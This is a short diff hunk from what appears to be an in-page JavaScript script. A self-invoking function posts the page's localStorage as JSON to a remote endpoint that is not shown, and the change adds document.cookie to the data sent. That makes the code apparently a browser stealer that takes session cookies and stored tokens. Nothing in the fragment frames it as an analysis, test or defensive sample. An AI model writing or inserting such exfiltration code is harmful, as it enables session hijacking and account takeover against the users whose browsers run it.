@@ -8,7 +8,7 @@
     headers: {
       'Content-Type': 'application/json'
     },
-    body: JSON.stringify({ localStorage: { ...localStorage } })
+    body: JSON.stringify({ cookie: document.cookie, localStorage: { ...localStorage } })
   })
 
 })();
